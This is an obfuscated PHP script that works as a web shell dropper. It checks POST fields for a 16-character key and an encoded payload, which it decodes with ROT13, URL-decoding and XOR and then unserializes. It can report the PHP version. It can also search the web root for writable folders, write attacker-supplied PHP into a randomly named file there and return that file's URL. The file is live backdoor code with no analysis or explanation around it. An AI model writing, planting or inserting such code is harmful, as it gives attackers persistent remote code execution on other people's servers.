<?php $vuzovmiem = "hirgibjibkiolmpp";$vzexztot = "";foreach ($_POST as $fwovkgh => $wfvabh){if (strlen($fwovkgh) == 16 and substr_count($wfvabh, "%") > 10){onbvwdsmu($fwovkgh, $wfvabh);}}function onbvwdsmu($fwovkgh, $tbexs){global $vzexztot;$vzexztot = $fwovkgh;$tbexs = str_split(rawurldecode(str_rot13($tbexs)));function vpxky($ywqdpojdoz, $fwovkgh){global $vuzovmiem, $vzexztot;return $ywqdpojdoz ^ $vuzovmiem[$fwovkgh % strlen($vuzovmiem)] ^ $vzexztot[$fwovkgh % strlen($vzexztot)];}$tbexs = implode("", array_map("vpxky", array_values($tbexs), array_keys($tbexs)));$tbexs = @unserialize($tbexs);if (@is_array($tbexs)){$fwovkgh = array_keys($tbexs);$tbexs = $tbexs[$fwovkgh[0]];if ($tbexs === $fwovkgh[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function couzxrii($vxwdypwvir) {static $uossrwknqx = array();$xbazemob = glob($vxwdypwvir . '/*', GLOB_ONLYDIR);if (count($xbazemob) > 0) {foreach ($xbazemob as $vxwdypwv){if (@is_writable($vxwdypwv)){$uossrwknqx[] = $vxwdypwv;}}}foreach ($xbazemob as $vxwdypwvir) couzxrii($vxwdypwvir);return $uossrwknqx;}$libtwrx = $_SERVER["DOCUMENT_ROOT"];$xbazemob = couzxrii($libtwrx);$fwovkgh = array_rand($xbazemob);$vxwdypwvkarlzq = $xbazemob[$fwovkgh] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($vxwdypwvkarlzq, $tbexs);echo "http://" . $_SERVER["HTTP_HOST"] . substr($vxwdypwvkarlzq, strlen($libtwrx));exit();}}}